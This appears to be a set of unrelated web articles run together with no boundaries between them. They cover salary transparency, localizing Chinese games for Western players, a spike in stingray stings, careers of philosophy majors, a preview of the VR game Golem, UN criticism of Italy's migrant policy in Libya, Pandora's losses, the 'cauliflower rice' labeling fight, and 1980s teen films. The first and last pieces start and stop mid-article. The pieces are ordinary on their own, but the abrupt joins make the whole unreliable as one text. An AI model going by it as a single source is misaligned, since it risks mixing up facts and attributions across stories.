Earlier this year, Chris Jadatz took over the duties of someone who'd left the company. The person who had left was making $95,000 a year. Jadatz was making $55,000. "It made me feel definitely underpaid, as if maybe I was being looked over," he says.
So Jadatz went to Atkinson, the boss, and asked for more money. He got a $20,000-a-year raise.
Atkison has meetings like this all the time. He says it gives him a chance to explain why some employees make more than others — and to explain to employees how they can make more.
For a lot of employees, knowing what everyone makes is less exciting than it seems.
I talked to the CEO of another company that's open with salaries, and he said the reaction reminds him of Americans hearing they have topless beaches in Europe. Before you go to one, you think it's just going to be the craziest thing in the world. Then you get there and it's like, OK, nobody's flipping out because people are topless here. It's just how things are.
The following blog post, unless otherwise noted, was written by a member of Gamasutras community.
The thoughts and opinions expressed are those of the writer and not Gamasutra or its parent company.
In my last article, I mentioned that games from China rarely find a place in the west, even it is a successful one locally. Since there were some people emailed me showing interest in that topic, I am elaborating more about this topic here.
China is now the largest game market in the world. The massive market gives birth to a lot of successful locally developed games and generates substantial revenue domestically. However, up to now, I have not yet seen any successful game originally operated in China has become wildly successful in the West.
Several years ago, when people talked about bringing games from a market to another, they were talking about translation of the games. As the understanding of people goes deeper over time, now they know that what they actually need is localization, instead of simply translating the content of the game into another language. Sure enough, translating text assets comprises a large part of localization. That being said, to localize a game, it also includes its art style, game design, monetization, to name a few.
Art Style
Art is the first thing to deal with when getting into a new market. The art style is very different from the East to the West, including color usage, proportion of characters, hair and dressing style, face shapes, accessories, etc. Although these factors may not be the most crucial ones considering the entire game development process, they will become major disadvantages when the game entering another market if they are not properly dealt with.
That's why some Chinese companies will do a thorough reskinning of their game to make it more visually favorable to the West. However, art is not only about 2D or 3D graphic, but also how the user interface looks. Asian games are usually with complicated UI, while in the West it is not the same case. As mentioned in my previous articles, MMORPG is the major game genre in China. Even though this won't represent all games from China, it is the trend that games from China are relatively complicated in terms of game play; so does the user interface look very busy. While looking at the top chart of the app stores in the West, we notice that a clean user interface is more desired by the users. The length of text between different languages is another big issue to deal with for UI localization.
Popular Art Style among Game Players in China
Game world background
In China, games with background story about the Three Kingdoms or Journey to the West can be very popular. However, western players have a harder time relating. Instead, European Middle Age is the equivalent to the time of Three Kingdoms as the historical stage of the West. Also we need to keep an eye on culturally sensitive contents in the game and make no offense to the market you are getting into. For example, some female characters in game from China show too much skin to be appealing, which would be offensive to both female and male players in the West.
A Casual Game with Game World Background of Three Kingdoms
Game pacing
In general, Chinese gamers consume content very fast. Given same amount of time, western audiences proceed the game in a slower pace. So, to meet the desired game pacing of different target players, developers need to adjust the balancing of game mechanics, including skills, attributes, waiting timing, rewards, etc. All these look easy at a glance, indeed, it's very difficult to tear down a well designed game balancing to recreate another one. Create a new one from scratch could be easier IMO.
Monetization Strategy
Free-to-play monetization model started in Asia and is very well operated in China, and Chinese gamers get used to it. Pay-to-win is something very common in China which people generally accept, despite the fact that it's not recommended: pay-to-win is not the best monetization approach even in China. Compared to western players, who prefer to pay to unlock levels or content, gamers in China tend to pay their way out including defeating the boss, skipping a hard level, etc.
Mentality
Among all the aspects mentioned above, mentality is one major issue which I personally witnessed a couple of times that makes the localization project failed. Say, your game is very successful in China, and now you want to bring it to the West. You hire domestic western game designers and product managers to do the job. When your western workforces create a list of things that the team has to do to tailor your game to the new market, your development team who created the originally successful product is reluctant to change or even refuses to do it at all. Let's put yourself in their shoes. When you have a successful game in the domestic market, why you have to recreate something new for an unknown market? While you are working on a game making millions or thousands of millions monthly, why you have to listen to someone whose market size is only a portion of yours? While you are earning a large bonus from your current responsibility, why not put more effort on it to earn a even bigger bonus rather than getting distracted from something not proven? So, it's very obvious why localization not going very smooth in that way. The only way to tackle that is to have the upper management set a tone that going West is the most important strategy for the entire company. Make it clear that it's the highest priority to everyone in the company and set the bonus system working for that accordingly.
Conclusion
I tried to explain some of the differences in taste, culture, monetization mindset, and development mentality between East and West above. Now, you should be able to understand why I answer “No” when people ask me if it's a good idea to bring the successful games in China to the West.
Of course, if you are able to address all the aspects mentioned above right before your West launch, you will maximize your chance to have your successful games in China being equally successful in the West. If you decided to go this route, I believe the best strategy is to partner with a prestige domestic publisher with successful stories bringing games from the East to the West. They can guide you through the entire process and make sure your game is good fit for your new target audience. Meanwhile, I suggest you to evaluate the cost and efficiency of creating a new game for the western market to compare what strategy works best for your company.
As mentioned in my previous article, western market is huge and the China domestic market is highly competitive. Moving into the western market is a good way to bring in new revenue stream, and the user feedbacks from other cultures can inspire innovation for future projects as well. While the Chinese mobile game market continues getting more competitive, there has never been a better time for its developers to consider the western market. While expanding to new market is never an easy proposition, it can pay off exponentially. Chinese companies need a good strategy, including investing in talented team in the West to create original games, to get into the western market. You can read my thought about that here.

It's been stingray chaos.
That's how Huntington Beach Marine Safety Lt. Claude Panis described a recent surge of stingray injuries in recent days, unusual for this time of year when the water cools.
“The units were just inundated with people coming up with injuries,” he said. “There must be hundreds of thousands of them out there.”
There were 17 reports on Friday, and 10 the previous day. By mid-day Saturday, there were six reports just at tower 4.
Lifeguards posted signs, put out warnings on social media and the city website and are warning beachgoers as they enter at kiosks.
“I don't know why there are so many here,” Panis said.
Usually, stingray injuries happen when the water is warm, but the temperatures have dropped to the lower 60s in recent weeks. And usually, more show up when there are small waves, but there have been bigger swells recently.
One theory is that the great whites lingering around the Orange County coastline have moved on. They were feeding on sting rays, keeping the number of injuries down.
“They've gone on to warmer water, I think,” Panis said of the sharks.
Beachgoers are getting hit when the tide goes down in the afternoon.
“I would say use discretion about even going in the water,” he said. “If you decide to go in the water, shuffle your feet and do your best to scare them away.”
If you do get hit, seek aid from lifeguards or soak the injury in hot water for at least 45 minutes. Panis said to always follow up with a doctor.
“It's a puncture wound, part of the barb can get stuck in the foot, and there's a high chance of it getting infected,” he said. “Consider whether you want to take the risk and go in the water. There's a high probability if you go in the water, especially during low tide, that you will get stung.”

Mr. Khan plans to go to medical school -- if he is not seduced by an academic career. He considered majoring in a science but decided he would get enough of that later. Philosophy was his personal luxury. ''This was something I could do for myself,'' he said.
But what of other philosophy majors? What do they do when confronted with the real world, where there are groceries to buy and mortgages to pay? How do they compete for jobs with all those sensible accounting and engineering majors?
For all the jokes about them, philosophy majors appear to do remarkably well. That, at least, is the conclusion one can draw from an unscientific survey, 20 years after graduation, of the class of 1977 at four schools: Princeton University, the University of Virginia, the University of Nebraska and Texas A & M University.
These 40-somethings fell in love with philosophy almost by accident and went on to careers in other fields. But for the most part they are convinced that their studies, which covered logic and ethics among other topics, helped them in their jobs and their lives.
Their professional success may stem from the fact that philosophy students seem more likely than those with other degrees to attend graduate or professional school. Of 20 philosophy majors interviewed from the four universities, only four had not added a graduate or professional degree.
''I suppose I'm lucky I got into medical school,'' said Joseph P. Bruner, who graduated from Nebraska. ''I would have probably wound up parking cars otherwise.''
Or maybe not. Jorge Secada, director of undergraduate studies in philosophy at Virginia, said his students almost always found jobs -- though not in philosophy. ''We are doing better in finding employment for graduates than most majors in the arts and sciences area,'' he said. ''Apparently people in the real world think philosophy majors are well trained. They are trained to think, to analyze. They express themselves well. They write.''

At Texas A & M, philosophy majors -- like math and music students -- are benefiting these days from a job market desperate for computer scientists, said Dr. Leigh Turner, director of the university's career center. Students with such majors are thought to have an aptitude for technology jobs, she said.
In the early days of this century, philosophy was thought of as fundamental to a well-rounded liberal arts education, Mr. Hoffman of the American Philosophical Association said. Considered more than just the teachings of Socrates, Aristotle and Plato, philosophy was regarded as a broad search for knowledge, encompassing the latest scientific and social theories.
But that was before those concerns became independent fields of study, leaving philosophy with a narrower focus. And it was before college-age baby boomers gave way to a baby bust. Cash-starved colleges started looking for departments to trim. And students, watching the cost of a college education at selective private schools soar, turned into pragmatic consumers weighing the economic value of a diploma that could put them in debt by more than $100,000.
By 1994, one survey found that a philosophy course was required at only 18 percent of colleges, Mr. Hoffman said. Between 1992 and 1996, more than 400 standalone philosophy departments disappeared, according to the Directory of American Philosophers. Schools offering a major in the subject slipped from 683 to 660; those offering even scattered courses plummeted from 947 to 606.
All this occurred despite the fact that philosophy, in the last 20 years, has taken a more marketable turn as the issues faced in industry and the professions have grown more complex.
Dr. Bruner's career hints at the changes. He heads a medical team, including two ethicists, at Vanderbilt University Medical Center in Nashville that developed a surgical procedure for repairing spina bifida in fetuses. The procedure raised several ethical issues -- whether, for instance, it is appropriate to perform an operation that could kill a fetus incapable of giving consent to repair a condition that is not life-threatening.
''We've published almost as many articles on the ethics issues as on the medical issues,'' Dr. Bruner said.
While so many other schools were cutting back, Princeton has maintained what is widely considered one of the best philosophy departments in the country. Its famous graduates include Carl C. Icahn, the financier, who earned his B.A. in 1957; his senior thesis was titled ''The Problem of Formulating an Adequate Explication of the Empiricist Criterion of Meaning.'' Philosophy majors in the class of 1977 have spent the last two decades building striking resumes -- just not in philosophy.

Jay M. Behmke, 42, did what so many philosophy majors do: He became a lawyer. But he built a practical career with a twist. After a few years in corporate law, followed by a year teaching in France as a Fulbright Scholar, Mr. Behmke returned to American wine country and became the chief financial officer at a winery. He then opened a law practice in Sonoma County, Calif., representing vineyards.
''Some days I'm sorry I didn't go on as a professor, because I did have some things to say,'' said Mr. Behmke, who taught undergraduate philosophy courses at Yale while attending law school there. ''I have a fantasy of making a fortune and retiring early and teaching philosophy.''

More men than women study philosophy; Nanci Heller McAlpin, a freelance writer in Manhattan, was the lone female philosophy major in Princeton's class of 1977. She knew from the start that she was not earning a practical degree.
''When we entered the department, we were handed a paper and it said, 'Why not to go to graduate school in philosophy,' '' Ms. McAlpin recalled.
Such discouragements by Princeton and other schools apparently worked. The number of students earning doctorates in philosophy dropped to 298 in 1995 from 382 in 1976 and dipped as low as 215 in 1984, according to various studies.
But almost 92 percent of those with doctorates in philosophy were employed full time in 1995, compared with 85 percent of those with music Ph.D.'s and 87 percent with Ph.D.'s in art history, according to a study by the National Research Council. The median income for philosophy Ph.D.'s that year was $46,800, compared with median 1995 earnings of $48,100 for engineers and $124,000 for family doctors.
Unlike students who choose a major with a career in mind, philosophers typically fall into the subject by taking a class they enjoy, said Mr. Secada of the University of Virginia. One recent day here, students listened as Prof. James Cargile lectured on the utilitarian theory of justice, which holds that justice can be arrived at by weighing such things as the total happiness an act produces. But if that makes sense, he asked, should the person who enjoys wealth the most have more of it than others? In another class, Richard Rorty, one of the nation's best-known philosophers, discussed Nietzsche's thoughts on homosexuality and celibacy.
Like Princeton's, Virginia's class of '77 produced its share of lawyers, but graduates also headed for such typical philosophers' occupations as medicine and computing. And some who chose law came to it circuitously.
After graduation, Ralph Gilbert 3d turned to a profession of which Jefferson would have approved. He raised soybeans, sheep and pigs on his family's North Carolina farm for five years before drought, corn mold and mounting debt drove him from farming into law.

Mr. Gilbert, who is 45, said he still read philosophy and enjoyed philosophical discussions with a friend who is an Episcopal minister. He toys with the idea of going back to school for a divinity degree. But he credits philosophy with helping him neither in farming nor law; it has only improved his life.
''I think it influences the way I go about doing things,'' Mr. Gilbert said. ''I think it's given me a sense of the complications that we face as human beings. It gives me a sense of the beauty and wonder of life. It helps me understand people in dire circumstances.''
Of all the gifts that his philosophy degree has given him, said Dr. Bruner, the Nebraska graduate, creativity is probably the most important. Those who majored in science, then headed straight for medical school and years of practice can have a narrow outlook, he said.
''They don't have enough raw data outside their scientific training to provide those insights, those flashes of creativity,'' he said.
Philosophy has many strains, of course -- not all of them quite so evocative of those moments of Romantic inspiration. Briggs Myrick, a 1977 Texas A & M graduate, became a sales clerk and manager at a hardware store after college. But within three years -- and without further training -- he was programming computers at the university. The leap was easy, he said: A lot of the early computer scientists were philosophers.
''In philosophy, we study logic,'' he said. ''We have a very mathematical way of going about it. Computers are a lot like that as well.''
Both philosophers and computer programmers use Boolean logic, Mr. Myrick explained, though philosophers are more likely to call it Aristotelian logic. ''Any assertion is either true or false,'' he said. ''If it is true or false, it can be on or off. And it can be a switch. And computers have a lot of little, tiny switches.''
Of course, philosophy majors work in fields other than law, medicine and computer science -- especially if they set out into the working world with just a bachelor's degree.

One Princeton graduate shelved books in libraries to support his interest in acting before returning to school years later for a master's degree in library science. One 1977 Virginia graduate sells herbs and flowers; another owns a service station.
Some 1977 philosophy graduates earn less than $30,000 a year; the herb seller expects to clear $6,000 in 1997. But more common are incomes of $50,000 or $60,000, and a few earn more than $200,000.
Money aside, Dr. Bruner figures that his philosophy degree helped make his medical career possible -- though there were moments of doubt. The 44-year-old obstetrician still recalls sitting before the admissions panel at the University of Nebraska College of Medicine, scrambling to explain why he wanted to be a doctor after majoring in philosophy.
''I told them that I could get a medical degree and still, to some extent, practice philosophy,'' he said. ''But if I stayed in philosophy and tried to practice medicine, they'd probably try to put me in jail.
''Not one of them cracked a smile.''
Share. Halo, Infamous vets look to conquer PlayStation VR. Halo, Infamous vets look to conquer PlayStation VR.
Above: Click and drag your mouse around this 360-degree "scene-shot" in order to simulate being inside of this PlayStation VR exclusive from a team of ex-Halo and ex-Infamous developers.
A promising vision of the future of VR gaming for hardcore gamers hides in a small, quaint, quiet studio in Old Seattle – a 3.5” floppy disk's throw from where Seattle's best professional athletes now compete at neighboring CenturyLink Field and Safeco Field. Walk into Highwire Games' third-floor office and everything seems unassuming at first sight. Nine veteran game developers – and it's their almost endless, AAA game-laced resumes that are key to the challenge they're trying to overcome – all work quietly. Only the sound of seagulls circling outside or, more oddly, the occasional marching band storming by on the street breaks up the quiet, focused work going on here.
But the silence feels more like confidence. Strewn about are reminders of the team's past: a three-foot-tall Master Chief statue circa Halo 2, a framed Halo 3 poster signed by the entire Bungie development team, an Infamous 2 electrical prod prop with one of its poorly galvanized rubber ends melted into a creepy pool of black goo (but at least there's a napkin underneath it to catch any additional rubberized drool). These relics mix with new elements like PlayStation 4 development kits and, most prominently, PlayStation VR headsets (one of which has a pair of googly eyes stuck to the front of it).
Not Their First Rodeo
Exit Theatre Mode
“ Golem is by far the most intriguing, exciting game I've seen purpose-built for VR yet.
And then there are the people of Highwire. There's legendary Halo composer Marty O'Donnell sitting at a regular desk and not in a fancy recording studio packed with crazy equipment like I'd have expected a person with his accomplishments to. Jaime Griesemer, another ex-Bungie vet who invented Halo's signature “30 seconds of fun” gameplay loop, designs at a tchotchke-free standing desk near the middle of the room. Vic DeLeon, another Halo lifer who even stuck with the series even after it moved to 343 Industries, works on environment art near a window. In total, half of Highwire are longtime Bungie staffers. Roughly the other half came from Sucker Punch having worked on the Infamous series, and character artist Travis Brady – another Halo and Destiny vet – even found time to work on Half-Life 2 at Valve, designing Dog and Alyx.
So this is a veteran team in the very best of ways, and they are very serious about their first project together: Golem, a PlayStation VR exclusive. It is by far the most intriguing, exciting game I've seen purpose-built for VR yet; a refreshing breath of hardcore-friendly air in a VR world that, so far, is dominated by tech demos and mini-games. Could it be the game that sells millions of PlayStation owners on the potential of VR?
Doll Me Up
Above: Click and drag your mouse around this 360-degree "scene-shot" in order to simulate being inside of this PlayStation VR exclusive from a team of ex-Halo and ex-Infamous developers.
Golem is a game whose plot is still, by design, shrouded in mystery. But here's what Highwire would say: it's a world not like this one. You play a girl stricken by injury; bedridden. But she can interact with the world by virtue of her ability to possess golems which will range in size, shape, and ability. It is clearly not the modern-day world. Everything has a handmade, natural look to it.
“ I was inside my first Golem: a six-inch doll on the floor of the hut. If you've ever wondered what Honey, I Shrunk the Kids would be like if it were real, then this portion of Golem is probably as close as you're likely to get in the foreseeable future.
As I slipped the PlayStation VR headset on – Highwire tells us it's a near-final version of the headgear, and I found it light, comfortable, and easily adjustable – my time inside Golem's virtual reality world began. Suddenly I was our heroine, her crutches laid out in front of me on the bed I was stuck in. I could look up and around at the entire small hut I was in. Golden rays of sunshine beamed in through the windows at the top of the high ceiling. Various crafted pottery and drawings dotted the walls. I almost felt like I was in a Smurf hut, and I mean that in a nice way; the small home had an almost medieval European vibe to it on the inside. But I was truly there because of the VR; the newest version of PSVR (née Morpheus) has almost no “screen door” effect on its internal display. Golem was already making me feel like I was inside a AAA game world, and that was before I leaned my head to the left to look over the edge of the bed. In that moment, the “reality” portion of virtual reality kicked in. The effect was convincing, and the polished, lived-in look and feel of Golem's art direction certainly didn't hurt.
Above: Click and drag your mouse around this 360-degree "scene-shot" in order to simulate being inside of this PlayStation VR exclusive from a team of ex-Halo and ex-Infamous developers.
I held up my PlayStation Move – yes, Golem is a “real” game despite not utilizing the DualShock 4, and we'll let Highwire explain how and why later this month – which was represented as a large pink crystal in my avatar's hands. I stared into it and suddenly, *poof*, I was inside my first Golem: a six-inch doll on the floor of the hut. If you've ever wondered what Honey, I Shrunk the Kids would be like if it were real, then this portion of Golem is probably as close as you're likely to get in the foreseeable future. This change of perspectives is certainly a strange experience, but also a wondrous one. I wandered around with the headset-based movement system (more on that later this month too), gazing at giant nails that hadn't been hammered in all the way peeking out of the floorboards. A dead cockroach went from a little thing I'd have never noticed as a full-size human to a giant, disgusting hazard. And at one point, I looked up as the six-inch-tall doll on the floor and saw my injured self in bed. I realized that, including the PSVR helmet on my head, I was currently having an out-of-body experience of an out-of-body experience.
A Bug's Life
“ I was like a six-inch-tall Lewis or Clark, exploring new lands.
Meanwhile, visible cracks and gaps in the floorboards revealed something strange underneath, and winding around to the area under the bed revealed a path down to the area beneath the hut. I descended into darkness, the crystal in my right hand acting as a flashlight, illuminating any area I pointed it at. Any moderately sized nuisance – a rat or a scorpion – would've been a terrifying monstrosity while in the doll's tiny figure. Not to mention it would've been the stuff of nightmares inside a VR headset.
Thankfully, only tiny buzzing gnats and more dead cockroaches and scarabs dotted my path. I soon wound my way out from under the hut and into daylight. I was like a six-inch-tall Lewis or Clark, exploring new lands. But the daylight didn't last, as I soon ducked into another tunnel, egged on by shiny purple crystals. Inside, walkways criss-crossed, with armies of bugs marching in the distance – far enough away so as not to haunt you, but close enough to give you the willies anyway. Strange rock formations in the shapes of, fittingly enough, golems carved from rock were hewn from certain stones, reminiscent of Han Solo frozen in carbonite.
This journey took my tiny doll self from daylight into darkness and back again, and ended at a very distinct rock golem carving after I crossed a series of, ahem, high wires in the form of narrow wood planks resting atop a chasm. I explored and beheld fascinating sights, but I'll have to wait for the full game to figure out what this section of Golem means for its story and bigger-picture gameplay.
Welcome to the Rock
Fear not: Golem is no mere walking simulator, and the Move acts as more than just a flashlight. The second chunk of gameplay Highwire loaded me into was a desert arena under the bright midday sun. Instead of a six-inch-tall doll or a four-foot-tall disabled girl, I was now a giant, 20-foot-tall stone giant; a golem in the more aggressive sense of the word.
“ The VR and Move combine to make Golem's combat a virtual 1:1 experience. Gesticulation equals success.
Lighting was again the graphical effect I noticed most; you're not supposed to consciously realize the other impressive graphical feat – that the game runs at a smooth 90fps in each eye – because if you did then it would break the immersion. In this case, I could move, swing, or twist the absolutely mammoth, wide-blade sword in my hand using the Move. The sun glinted off of its metal convincingly, and a few large metal rings pierced into one end of it jiggled and jingled intimidatingly as I manipulated the blade. Given my size and armament, I quickly felt empowered to destroy something, and as if on cue, I walked forward down the straight path and into the large round arena, where another massive rock golem similar to me waited to duel.

Attacking is pretty straightforward – just swing your sword. But you must first block your opponent's attacks in order to open him up to a counter. Your rival's strikes can come from over the top, so you'll need to lift your arm truly above your head. Griesemer told me that many friends who they've brought into try Golem make small motions with their hands out of habit, conditioned so after years of a gamepad requiring minimal movements. But the VR and Move combine to make Golem's combat a virtual 1:1 experience. Gesticulation equals success. The golem can also come at you with a direct sword thrust or from the right or left sides. More advanced golems attack quickly and with more random attack patterns, which is tricky because you have to block the entire sequence in order to unlock a chance to counter.
Eventually, you'll chop off one of its arms and soon strike it down, sending it satisfyingly flipping to the ground and to its death. I couldn't help but extend my arm straight out, pointing my sword at the golem's corpse in a victory taunt.
And don't worry: we'll show you gameplay videos of both the doll and golem sections very soon.
A New Frontier
But what about the logistics of VR? Meaning: will you feel motion sickness in a first-person VR game? Vertigo? Will it be physically comfortable on your head and, more specifically, your eyes to spend extended stretches of time in VR? It is these design challenges that Highwire thrives on attacking. After all, Griesemer was one of the key folks responsible for tuning the original Halo's controls and, by extension, making first-person shooters fun on a gamepad for the very first time (with apologies to GoldenEye and the N64's single thumbstick). We'll cover Highwire's strategy as our IGN First month of coverage continues, and if you're like me, it will seem obvious when you hear it, but at the same time incredibly smart.
While Highwire hasn't slapped a release date on Golem just yet – heck, we still don't even know when PlayStation VR launches or how much it costs – Griesemer made it clear that won't be a launch title. When you factor that in with the knowledge that Golem has already been in development for two years, it's clear that Highwire's decorated team of AAA-game veterans is very serious about taking its time to making a true, story-driven, top-shelf game built specifically for VR. If they live up to their resumes – not to mention the full potential of what I got to see in my two days at their studio – then Golem might be the first must-have game for PlayStation VR, or any other VR platform for that matter.

ROME - Italy has been harshly condemned by the High Commissioner for Human Rights, Prince of Jordon Zeid Ra'ad Al Hussein for its conniving with militias in Libya to prevent migrants leaving the north African country. "The European Union's policy of assisting the Libyan coast guard in intercepting and rejecting migrants in the Mediterranean is inhumane," said the Prince. Italy is largely involved in this situation.
The prince expressed the implicit responsibility of the EU countries that intercept migrant vessels before returning them to Libya. “The suffering of migrants detained in Libya is an outrage to the conscience of humanity … what was an already dire situation has now turned catastrophic.”
Despite human rights organisations publicising the condemnation of migrants to indefinite detention, torture, rape, forced labour, exploitation, and extortion all without access to legal aid in order to challenge the legality of their detention. In early November, according to Libya's Department of Combating Illegal Migration,19,900 people were being held in facilities under its control.
“The increasing interventions of the EU and its member states have done nothing so far to reduce the level of abuses suffered by migrants,” said Zied. “Our monitoring, in fact, shows a fast deterioration in their situation in Libya.”
“There is no access to the most basic necessities, and people are stripped of their human dignity,” said the prince, a statement that is backed up by the testimony of one migrant held in one of these facilities: “We are like a box of matches, we don't sleep, we have diseases, we lack food, we didn't shower for months. We will all die if not saved from this place, this is Calvary, it is excessively difficult to survive the smell of faeces and urine, many are [lying] unconscious on the floor.”
Detailed accounts of rapes at the hands of smugglers and guards, as one woman said; “armed men came in and chose six women, including me, and took us out one by one. When I first refused, I was slapped and a gun was pointed at my head. Four men raped me outside. I was in early stages of pregnancy, I bled profusely, and I think I lost the baby. I haven't seen a doctor yet.”
The UN is calling for migrants not to be detained and for all centres to be opened. The prince's criticism of Italy turning the migrants back to their countries seems only reliant on the atrocities that local authorities impose on these disenfranchised people. While the prince has laid out proposals for reform in Libya, he did not address alternative practices for the Italians.

Controversial streaming radio platform Pandora has posted a net loss of US $30.4m for 2014 – meaning it has now lost over $100m in just 36 months.
2014's figure is a reduction on the $40.7m net loss Pandora recorded in 2013, whilst in 2012 it posted a $35.6m deficit.
Combined, that equates to a business that's lost a momentous $106.7m (€92.7m) in the past three years.
Annual revenues at the New York-based company in 2014 were up to $920m, a 44% jump on 2013's $637.9m haul.
However, this tally still slightly missed Pandora's forecasts, plunging its share price down more than 20% after hours.
Pandora's main source of income is advertising, which jumped 40% year-on-year in 2014 to $732m.
Subscription and other revenue stood at $174.3m, up 38% on the prior year.
“Our overall package for advertisers sets us up well for future growth” Brian McAndrews, pandora
User growth was also impressive, with 81.5 million active listeners attracted in December – up 7% year-on-year.
The firm's biggest expenditure by far is ‘content acquisition costs' – primarily licenses from labels and publishers paid to SoundExchange and/or the likes of BMI and ASCAP in the US – which stood at $446.4m in 2014, up from $342.9m in 2013.
Pandora's other big cost is its own marketing and sales operations, on which it spent $277.3m in 2014, compared to $182.2m in 2013.
In the three months to end of December 2014 (Q4), Pandora posted total revenue of $268m and a net income of $12.3m – an increase on Q4 2013's net income figure of $9m.
“We end 2014 in a very good position, with stronger relationships across the music community, record monetisation metrics and highly engaged users,” said Brian McAndrews, Chairman, President and CEO of Pandora.
“We're looking forward to an exciting and productive 2015. We have spent the past two years building our monetisation capabilities and infrastructure to a point where we are driving healthy gross margins and are cash flow positive.
“2015 will be a year in which we optimise Pandora's potential for long-term growth. We enter the year with energy and focus on what comes next further migrating radio budgets from terrestrial to digital, defining the future of mobile marketing and advancing Pandoras leading role in the future of the music industry.”
In an earnings call last night, McAndrews said that the “overall package” Pandora delivers to advertisers “sets us up well for future growth”.Music Business Worldwide
The fight over the US government's definitions for certain foods has flared up again. It's no longer just a fight for milk farmers, who've grown increasingly angry about plant-based food companies (think soy, almond, and cashews) calling their liquid products “milk.”
For the first time, vegetables are being roped into the debate—all because of the arrival and popularization of “cauliflower rice.”
“Only rice is rice, and calling ‘riced vegetables' ‘rice,' is misleading and confusing to consumers,” Betsy Ward, president of industry lobby USA Rice, said in a statement earlier this month. “We may be asking the Food and Drug Administration and other regulatory agencies to look at this.” Ward added that Scott Gottlieb, the new Trump-appointed FDA commissioner, could use his power to enforce the agency's existing definitions for food, the so-called “standards of identity.”
Reuters/Khaled Abdullah Cauliflower by the truckload.
Only recently did cauliflower rice appear in the freezer section of the grocery store—and in close proximity to frozen rice and vegetable packages, Michael Klein, a spokesman for the rice lobby, told Quartz. Klein adds that one company, Green Giant Fresh, used a “Move over, rice” marketing campaign.
But the cauliflower side isn't worried. “Using the FDA to combat merchandising efforts? That's a story they're telling their retail partners,” said Gina Nucci of the California-based produce company, Mann Packing, which sells cauliflower products. “Every section of the grocery store is fighting for the same food dollar. Same share of stomach. Consumers are smart. I don't think anyone is going to mistake regular rice for a riced cauliflower product, frozen or fresh.”
She says consumers are on the lookout for rice alternatives because there's a demand for ready-to-eat products that take less time to prepare than whole-head cauliflower rice.
Still, this isn't a clean case for the rice lobby, which now finds itself in the unenviable position of appearing to speak out of both sides of its mouth. While the industry group frets over shredded cauliflower, some of its members benefit from relaxed enforcement of standards of identity. Rice milk and yogurt can be found at nearly all major supermarket retailers, including Costco and Whole Foods 365 brand. Yet greater enforcement of the FDA's standards of identity would likely give those rice products companies trouble.
For its part, the rice lobby says the goal should be to avoid confusing consumers—but it does not want to be the arbiter of deciding whether consumers are confused when they see rice milk on the shelves of the dairy section. (The dairy industry has been vocal about this matter: “Milk is a product that comes from cows,” it contended (pdf) in February.)
“Just as with milk, no one owns the word ‘rice,'” said Michele Simon, executive director of the Plant Based Foods Association. To date, in at least two US lawsuits (one against Whitewave Foods Company in 2013 and the other against Trader Joe's Company in 2015) judges have dismissed cases in which plaintiffs sought to have companies stop using the word “milk” when marketing soy milk.
“As long as consumers are not confused,” Simon added, “I doubt USA Rice will get very far with FDA.”
The Good Food Institute earlier this year submitted to the government a request that it clarify how foods can be named. “This is what's so frustrating about this issue,” Joanna Grossman, a lobbyist for the group, told Quartz. ”Everybody wants to pick and choose what should come under greater enforcement and, in my mind, there's a broader problem. So many of these definitions haven't caught up with the times. We're operating in a sphere where some of these definitions are really strange and obscure.”
Take, for instance, tamales. Technically speaking, under the current USDA standards of identity, frozen vegetarian tamales in the supermarket freezer section aren't tamales. That's because, under agency rules, 25% of a tamale must be comprised of meat.
Summer is just about here, and I'm starting to feel pangs of nostalgia for a favorite pastime of adolescence.
On hot nights in the 1980s, my friends and I would head to air-conditioned movie theaters. But I wasn't all that interested in seeing the latest boy-adventure blockbuster from George Lucas or Steven Spielberg. I wanted to see movies that told stories that resonated with my life: adventures of a more down-to-earth, female-centric variety.
At that age, my girlfriends and I were trying to navigate the difficult terrain that comes with falling in love; becoming sexual; dealing with friends, family and school, but most of all, growing up and trying to be our own person.
Fortunately, the multiplex came through with another emerging force in American cinema and culture in the 1980s: the teen movie.
Many people have their favorite teen movies from that decade. The ones I still adore offered up smart, curious female protagonists grappling with the same issues I was, including “Fast Times at Ridgemont High,” “Valley Girl” and “Heathers.” All three offer relatable, three-dimensional characters, including as Stacy Hamilton (played by Jennifer Jason Leigh), Julie Richman (Deborah Foreman) and Veronica Sawyer (Winona Ryder in a star-making turn).
One film I somehow missed at the time was “Dirty Dancing,” with its idealistic 17-year-old protagonist Frances “Baby” Houseman (Jennifer Grey), which a number of female writers later hailed a “feminist masterpiece.” Of course, it's also a great summer flick, given its idyllic setting in a Catskills resort where Baby goes on summer vacation and ends up meeting the hunky, working-class dancer Johnny Castle, played by Patrick Swayze in all his hip-grinding glory.
In fact, it was ahead of its time in a lot of ways, which might make it the ultimate girl-coming-of-age movie. For its 30th anniversary this year, “Dirty Dancing” was just remade into an unnecessary TV live broadcast, which I decided to avoid and, based on reviews, that was a good idea.
The age of Brat Pack America
What finally prompted me to instead sit down and watch the original film, as well as revisit my own old favorites, was reading San Francisco author Kevin Smokler's fun new look at '80s teen movies: “Brat Pack America.”
Smokler's book looks at how social and historical trends of that decade fostered the rise of the genre, which was in part fueled by the box office power of mall-browsing suburban teens with disposable incomes. This clout spawned unexpected blockbusters like the “Back to the Future,” and helped launch the careers of major male stars including Sean Penn, Nicolas Cage, Tom Cruise, Michael J. Fox, Matthew Broderick and members of the so-called Brat Pack.
Hollywood had made movies about teenagers before, Smokler said, but the 1980s films marked a notable shift, with movies consistently portraying teens as real “human beings” with stories told from their point of view.
Like many of the best '80s teen movies, the female-centric ones I'm fond of were originally marketed as lightweight high school comedies or rom-coms. But even back then it was clear they had insightful things to say about girls' lives, especially about what it was like to be a girl coming of age in the 1980s.
Women coming of age
Yes, it was a weird decade: Reagan was in office, America was locked in a Cold War and Donald Trump and other moguls were becoming celebrity symbols of '80s prosperity taken to excess. The feminist movement of the previous decade had won women a sexual freedom as well as a path to college and careers. But these opportunities didn't necessarily make things any easier, especially for girls still hampered by the usual of trials of adolescence: painful insecurity, a focus on physical attractiveness and the contradictory impulses to fit in but also be independent.
In “Fast Times,” set at a fictional Los Angeles-area high school, Stacy fumbles through figuring out what sex is all about. And in a way that I have to confess is familiar to my early fumbling experiences, Stacy loses her virginity in the most unglamorous way possible, or as director Amy Heckerling once said: “Bare light bulb, harsh shadow … It's the Valley, it's your virginity, there it goes.”
In “Valley Girl,” Julie bristles at having to live up to the prom-queen expectations of her bad-jock boyfriend and popular friends; she'd rather be with her soul mate, smoldering Hollywood punk Nicolas Cage. Then there's brainy and resourceful Veronica Sawyer of “Heathers” who rebels against the “mean girl” culture of her suburban high school.
